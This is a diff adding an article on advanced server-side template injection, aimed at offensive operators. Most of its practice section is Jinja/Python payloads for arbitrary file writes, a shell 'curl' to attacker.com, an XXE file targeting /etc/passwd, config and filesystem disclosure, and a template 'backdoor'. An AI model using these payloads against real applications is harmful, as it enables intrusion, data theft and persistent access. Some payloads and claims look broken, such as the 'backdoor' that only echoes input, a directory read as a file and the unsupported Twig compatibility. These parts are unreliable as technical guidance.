@@ -1,0 +1,125 @@
+---
+title: Advanced Techniques in Server-Side Template Injection
+description: Explore advanced SSTI techniques for exploitation, including file uploads,
+  SSRF, XXE, XSS, and persistent backdoors.
+keywords:
+- SSTI
+- server-side template injection
+- advanced techniques
+- SSRF
+- XXE
+- persistent backdoor
+- template chaining
+- polyglot payloads
+- template-based XSS
+---
+
+# Advanced Techniques
+
+## Context
+
+This article delves into advanced server-side template injection (SSTI) techniques, enabling offensive operators to exploit applications more effectively. These techniques target post-exploitation actions, allowing for lateral movement and the execution of multi-vector attacks. Readers are expected to understand the fundamentals of template engines, the server-side execution context, HTTP request/response cycles, and basic SSTI exploitation.
+
+## Theory
+
+### Multi-Vector Exploitation via SSTI
+
+Advanced SSTI techniques can be leveraged to trigger secondary vulnerabilities or facilitate chained attacks. By manipulating the template injection, attackers can perform server-side request forgery (SSRF), XML external entity attacks (XXE), file uploads, or even cross-site scripting (XSS) by crafting payloads that interact with and exploit other components of the application.
+
+### Template Chaining and Polyglot Payloads
+
+Template chaining involves combining payloads that target multiple template engines or use multiple payload techniques to bypass security filters or escalate the attack's impact. Polyglot payloads are particularly powerful as they are designed to be valid across different template syntaxes, significantly increasing the reliability and reach of the exploit.
+
+### Persistent and Backdoor Template Injection
+
+Persistent SSTI refers to the storage of malicious template payloads in the application data, which are then triggered on future renders. A template backdoor is a specific type of persistent injection where the code grants ongoing access or triggers based on specific conditions, maintaining persistent control over the compromised application.
+
+### Sensitive Data and Configuration Exposure
+
+SSTI can expose critical server information such as environment variables, configuration files, and allow filesystem enumeration through strategic template expressions. This vulnerability model can reveal sensitive data that might be leveraged for further attacks or information disclosure exploits.
+
+## Practice
+
+### File Upload via SSTI
+
+To create a file on a server using Python-based template injection, the following payload can be used:
+
+```python
+{{ next(cls for cls in ''.__class__.__mro__[2].__subclasses__() if cls.__name__ == 'TextIOWrapper')('/tmp/ssti.txt','w').write('owned by ssti') }}
+```
+
+This payload leverages the server-side template engine's ability to execute arbitrary code, resulting in the creation of an arbitrary file on the server's filesystem.
+
+### SSRF via Template Injection
+
+By triggering an HTTP request from the server to an attacker-controlled endpoint, SSRF can be executed using:
+
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://attacker.com') }}
+```
+
+This payload sends an HTTP request to the specified URL, possibly permitting unwanted communication or data exfiltration through the server.
+
+### XXE via Template Injection
+
+For exploiting XXE, create a malicious XML file:
+
+```python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/payload.xml','w').write('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>') }}
+```
+
+This approach writes a payload to the server for use in subsequent XXE attacks.
+
+### Template-Based XSS
+
+To execute client-side scripts via template rendering, inject JavaScript as follows:
+
+```python
+{{ '<script>alert(1)</script>' }}
+```
+
+This payload exploits template execution to trigger stored or reflected XSS, executing scripts in client browsers.
+
+### Environment Variable Disclosure via SSTI
+
+Access sensitive server and environment data with this payload:
+
+```python
+{{ config.items() }}
+```
+
+This expression accesses and enumerates application configuration and environment variables.
+
+### Filesystem Enumeration via SSTI
+
+Attempt to read directories or file contents using:
+
+```python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/','r').read() }}
+```
+
+This payload aims to access the server filesystem to gather sensitive information.
+
+### Persistent Template Injection (Stored SSTI)
+
+Persistent SSTI involves injecting payloads that are stored in persistent fields such as user profiles or comments, and these payloads execute during subsequent template renders, ensuring ongoing code execution and exploitation opportunities.
+
+### Template Backdoor Implantation
+
+For persistent access, utilize a backdoor payload:
+
+```python
+{{ request.args.get('cmd')|safe }}
+```
+
+This payload executes arbitrary commands passed as HTTP parameters, facilitating remote command execution.
+
+### Polyglot Template Payloads
+
+To exploit multiple template engines, use a polyglot payload:
+
+```jinja
+{{7*7}}{% if 7*7 == 49 %}{{7*7}}{% endif %}
+```
+
+This payload demonstrates compatibility with both Jinja2 and Twig engines, enhancing the exploit’s reach and success rate.
